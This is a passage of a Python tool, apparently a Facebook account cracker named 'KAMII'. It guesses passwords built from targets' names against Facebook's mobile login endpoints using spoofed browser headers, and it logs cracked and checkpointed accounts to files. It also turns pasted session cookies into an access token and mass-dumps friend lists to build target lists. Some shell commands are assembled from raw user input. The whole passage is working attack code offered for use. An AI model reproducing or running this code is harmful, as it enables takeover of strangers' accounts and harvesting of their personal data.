            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            uaa = random.choice(uiph)
            head = {'Host': 'x.facebook.com',
                    'method': 'GET',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"(Not(A:Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"iOS"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent':uaa,}
            getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
            str(getlog.text)).group(1),"uid":ids,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            kami=session.cookies.get_dict().keys()
            if "c_user" in kami:
                coki=session.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print('\r\r\033[1;32m [KAMII-OK] %s | %s'%(ids,pas))
                open('/sdcard/KAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in kami:
                if 'y' in pcp:
                    print('\r\r\33[1;33m[KAMII-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/KAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1
# method 2 from opera browser
def mbasic(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write('\r\r\033[1;37m[KAMII-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            uaaa = random.choice(uiph)
            head = {'Host': 'mbasic.facebook.com',
                    'method': 'GET',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"(Not(A:Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"iOS"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent':uaaa,}
            getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
            str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            kami=session.cookies.get_dict().keys()
            if "c_user" in kami:
                coki=session.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print('\r\r\033[1;32m[KAMII-OK] %s | %s'%(ids,pas))
                open('/sdcard/KAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in kami:
                if 'y' in pcp:
                    print('\r\r\33[1;33m[KAMII-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/KAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1


# method 03 use radom user agents

def basic_rnd(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write('\r\r\033[1;37m[KAMII-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            uaaaa = random.choice(ugen2)
            head = {'Host': 'mbasic.facebook.com',
                    'method': 'GET',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"(Not(A:Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"macOS"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent':uaaaa,}
            getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
            str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            kami=session.cookies.get_dict().keys()
            if "c_user" in kami:
                coki=session.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print('\r\r\033[1;32m[KAMII-OK] %s | %s'%(ids,pas))
                open('/sdcard/KAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in kami:
                if 'y' in pcp:
                    print('\r\r\33[1;33m[KAMII-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/KAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1


#  login menu
def login():
        os.system('clear')
        print(logo);xchker()
        cookies = input(' Put cookies here: ')
        try:
                print('\n Validating cookies ... ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open("access_token.txt", "w").write(find_token.group(1))
                open("fb_cookies.txt","w").write(cookies)
                print(' Logged in successfully ...')
                time.sleep(1)
                os.system('python KAMII.py')
        except KeyError:
                print('\n Inavlid cookies, try another cookies')
                menu()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                menu()
        except AttributeError:
                print('\n Invalid cookies, try another cookies ...')
                exit()


#  making file menu

def create_file():
        os.system('clear')
        print(logo);xchker()
        print('\033[1;32m[1] Create File ')
        print('\033[1;32m[0] Back')
        print('\033[1;37m----------------------------------------------')
        create_ = input('\033[1;32mSelect : ')
        if create_ == "1":
                create_file_login()
        elif create_ == "0":
                menu()
        else:
                exit('invalid select')

def create_file_login():
        ids = []
        total = []
        xyz = requests.Session()
        os.system('clear')
        print(logo);xchker()
        try:
                cok = open('fb_cookies.txt','r').read()
                cookies = {'cookie':cok}
                access_token = open('access_token.txt', 'r').read()
        except FileNotFoundError:
                login()
        try:
                check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
                load = json.loads(check_cookies)
                iid = load['id']
                name = load['name']
        except KeyError:
                print('\n Cookies has expired')
                time.sleep(1)
                os.system('rm -rf .fb_cookies.txt .access_token.txt')
                login()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        os.system('clear')
        print(logo);xchker()
        print("\033[1;32m[1] Create File Mix Ids")
        print("\033[1;32m[2] Create File New Ids")
        print('\033[1;37m----------------------------------------------')
        typp = input('select : ')
        if typp == "1":
                auto_file(cookies,access_token)
        elif typp == "2":
                new_file(cookies,access_token)
        else:
                auto_file(cookies,access_token)

def auto_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f'[*] Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        sid = "1"
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;33m /sdcard/filename.txt \033[0;97m\n')
        #100010138361148
        sf = input('\032[1;32m Saved File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print('\032[1;32m Total ids To Dump: '+str(len(file)))
        print('\033[1;32m Dumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(file_ex,exid,cookies,access_token,sf)
        print('\033[1;31m Total ids Extracted : '+str(len(total)))
        input('\033[1;31m Press enter to back ')
        menu()

def new_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f'[*] Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        print('\n\033[1;31mExample: 100087,100088 etc\033[0;97m')
        try:
                sl = int(input('\n\033[1;32mHow Many Links To Grab : '))
        except:
                sl = 1
        for el in range(sl):
                sid = input(f' Put {el+1} link: ')
                os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;33m/sdcard/filename.txt \033[0;97m\n')
        #100010138361148
        sf = input('\033[1;32mSave File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print('\033[1;32mTotal ids To Dump: '+str(len(file)))
        print('\033[1;32mDumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(file_ex, exid,cookies,access_token,sf)
        try:
                son = f"kami{str(random.randint(0,90))}.txt"
        except:
                son = f"kami{str(random.randint(10,50))}.txt"
        os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
        print('\033[1;32m Total ids Extracted : '+str(len(total)))
        print('\033[1;32m New ids Saved As : /sdcard/'+son)
        print('\033[1;32m Normal ids Saved As : '+sf)
        input('\033[1;32m Press enter to back ')
        menu()

def file_ex(exid,cookies,access_token,sf):
        try:
                global total,loop
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
                xyz = requests.Session()
                r = xyz.get(fd_url,cookies=cookies).text
                q = json.loads(r)
                for yaad in q['friends']['data']:
                        iid = yaad['id']
                        name = yaad['name']
                        total.append(iid)
                        open(sf,'a').write(iid+'|'+name+'\n')
                loop+=1
                sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        except Exception as e:
                pass
                #print(e)
        except KeyError:
                pass

def sprate():
        xchker()
        os.system('clear');print(logo);xchker()
        try:
                limit = int(input('\032[1;32m How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'\032[1;33mFile Path Example /sdcard/filename.txt')
        print('\033[1;37m----------------------------------------------')
        file_name = input('\\032[1;32m Input file path : ')
        print('\033[1;37m----------------------------------------------')
        print(f'\032[1;33mSave As Example /sdcard/newfile.txt')
        print('033\1;37m----------------------------------------------')
        new_save = input('\\032[1;32m Save new file as : ')
        print('\033[1;37m----------------------------------------------')
        y = 0
        print(f"\032[1;31mIds To Grabb Ex [ 100087,10000,10006 etc ]")
        print('\033[1;37m----------------------------------------------')
        for k in range(limit):
                y+=1
                links=input('\032[1;33m Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(44*"\033[0m-")
        print(f'\032[1;32mids grabbed successfully')
        print('\032[1;32mTotal grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\032[1;32mNew file saved as : \033[0;33m '+new_save)
        print(44*"\033[0m-")
        input('\032[1;32m[Press enter to back] ')
        menu()

def double():
        os.system('clear')
        print(logo);xchker()
        user_file = input('File Path : ')
        print('\033[1;37m----------------------------------------------')
        try:
                open(user_file,'r').read()
                print('\n\033[1;33mExample: /sdcard/filename.txt')
                print('\033[1;37m----------------------------------------------')
                save_file = input('Save new file as: ')
                print('\033[1;37m----------------------------------------------')
                os.system('touch '+save_file)
                os.system('sort -r '+user_file+' | uniq > '+save_file)
                print('\033[1;37m----------------------------------------------')
                print('\033[1;32m Fully Removed Multi Lines Ids')
                print('\033[1;37m----------------------------------------------')
                print('\033[1;32m Dublicate Lines Removed From File')
                print('\033[1;32m File Saved As : '+save_file)
                print('\033[1;37m----------------------------------------------')
                input('\033[1;32mPress enter to back ')
                menu()
        except FileNotFoundError:
                print(' Invalid File ')

aprv()
    